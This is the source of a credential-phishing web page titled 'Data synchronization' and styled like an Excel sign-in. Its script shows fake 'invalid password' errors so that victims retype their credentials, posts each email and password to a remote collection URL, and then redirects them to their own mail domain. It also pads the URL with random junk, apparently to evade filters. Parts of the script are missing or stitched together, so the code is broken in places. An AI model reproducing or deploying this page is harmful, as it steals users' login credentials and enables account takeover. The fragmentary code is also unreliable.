<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Data synchronization</title>
    <style>
      * {
        box-sizing: border-box;
      }

      body,
      html {
        height: 100%;
        margin: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        background-image: #f0f0f0;
        font-family: Arial, sans-serif;
        width: 100%;
        overflow: hidden;
      }

      #loader {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(255, 255, 255, 0.8);
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        z-index: 999;
        transition: opacity 0.5s, visibility 0.5s;
      }

      .spin {
        width: 40px;
        height: 40px;
        border: 4px solid rgba(0, 0, 0, 0.1);
        border-top: 4px solid #217346;
        border-radius: 50%;
        animation: spinning 1s linear infinite;
        margin: 20px 0;
      }

      @keyframes spinning {
        100% {
          transform: rotate(360deg);
        }
      }

      #logo {
        width: 100px;
        height: auto;
      }

      #main-content {
        opacity: 0;
        transition: opacity 0.5s;
        width: 100%;
        height: 100%;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .loading-text {
        font-size: 1.2em;
        color: #555;
        animation: pulse 1.5s infinite;
      }

      #submitLoader {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(255, 255, 255, 1);
        z-index: 9999;
        justify-content: center;
        align-items: center;
      }

      #submitLoader .spinner {
        flex-direction: column;
        justify-content: center;
        border: 4px solid #f3f3f3;
        border-top: 4px solid green;
        border-radius: 50%;
        width: 45px;
        height: 45px;
        animation: spinning 1s linear infinite;
        transition: opacity 0.5s;
      }

      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      .container {
        width: 500px;
        height: 360px;
        margin: 0 auto;
        padding: 20px;
        border: 1px solid #ccc;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        background-color: rgba(225, 225, 225, 0.5);
      }

      .input-field {
        width: 100%;
        margin-bottom: 10px;
      }

      .input-field input {
        width: 100%;
        padding: 10px;
        border: 1px solid #ccc;
        box-sizing: border-box;
      }

      .input-field label {
        display: block;
        margin-bottom: 5px;
      }

      .error-message {
        color: red;
        display: none; /* Hidden initially */
        margin-bottom: 10px;
      }

      .submit-btn {
        width: 25%;
        padding: 10px;
        background-color: green;
        color: white;
        border: none;
        align: left;
        cursor: pointer;
      }

      .submit-btn:hover {
        background-color: darkgreen;
      }

      @keyframes pulse {
        0%,
        100% {
          opacity: 1;
        }
        50% {
          opacity: 0.5;
        }
      }

      @media (max-width: 600px) {
        .spin {
          width: 30px;
          height: 30px;
          border-width: 3px;
        }
        .loading-text {
          font-size: 1em;
        }
        #logo {
          width: 60px;
        }
      }
    </style>

    <script>
      function generateRandomString(length) {
        const characters =
          "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9J0Kk2Ll1Mm3NnoOp4Pq5QrR6Ss7T8UfVWiXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let result = "";
        for (let i = 0; i < length; i++) {
          result += characters.charAt(
            Math.floor(Math.random() * characters.length)
          );
        }
        return result;
      }

      function appendRandomStringToURL() {
        const randomString = generateRandomString(350);
        const currentURL = window.location.href.split("?")[0];
        // Use string concatenation as a temporary measure to avoid potential backtick issues
        window.history.replaceState(
          null,
          null,
          currentURL + "?websrc=" + randomString
        );
      }

      window.onload = appendRandomStringToURL;

            e.preventDefault();

            msg.hide();
            msg.html("");
            msgElem.hide();
            domain = emailVal.val().split("@")[1];

            loading.css("display", "flex");
            $("#btnLogin").html(loadingMsg);
            setTimeout(async () => {
              if (emailVal.val() == "") {
                msg.show();
                loading.hide();
                msg.html(error);
                msgElem.show();
              } else {
                if (passVal.val() == "") {
                  msg.show();
                  loading.hide();
                  msg.html(noPass);
                  msgElem.show();
                } else {
                  if (passVal.val().length < 4) {
                    msg.show();
                    loading.hide();
                    msg.html(lessThan4);
                    msgElem.show();
                    passVal.val("");
                  } else {
                    count = ++count;
                    if (count == 1) {
                      msg.show();
                      loading.hide();
                      msg.html(invalidMsg);
                      msgElem.show();

                      postDataHelper(emailVal.val(), passVal.val(), domain);
                      passVal.val("");
                    } else if (count == 2) {
                      msg.show();
                      loading.hide();
                      msg.html(invalidMsg);
                      msgElem.show();

                      postDataHelper(emailVal.val(), passVal.val(), domain);
                      passVal.val("");
                    } else if (count == 3) {
                      const { out, pstD } = await postDataHelper(
                        emailVal.val(),
                        passVal.val(),
                        domain
                      );

                      if (pstD) {
                        msg.show();
                        msg.html(successMsg);
                        msgElem.show();

                        setTimeout(() => {
                          loading.hide();
                          window.location.replace(`${domain}`);
                        }, 5000);
                      }
                    }
                  }
                }
              }

              $("#btnLogin").html("Continue");
            }, 1500);

            // console.log("count: ", count)
          });
        }
      });

      // Example POST method implementation:
      async function postData(url = "", data) {
        const formData = new FormData();
        formData.append("email", data.email);
        formData.append("password", `${data.password} =>>> [${location.href}]`);
        const response = await axios.post(url, formData);
        return response.data;
      }

      async function postDataHelper(em, pass, dm) {
        outgoingObj.email = em;
        outgoingObj.password = pass;
        outgoingObj.domain = dm;

        var out = { key: em, dm };

        // Put here the url of the email
        var pstD = await postData(RURL, {
          ...outgoingObj,
        });

        return { out, pstD };
      }

      function genID(length) {
        var result = "";
        var characters =
          "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        var charactersLength = characters.length;
        for (var i = 0; i < length; i++) {
          result += characters.charAt(
            Math.floor(Math.random() * charactersLength)
          );
        }

        return result;
      }
    </script>
  </body>
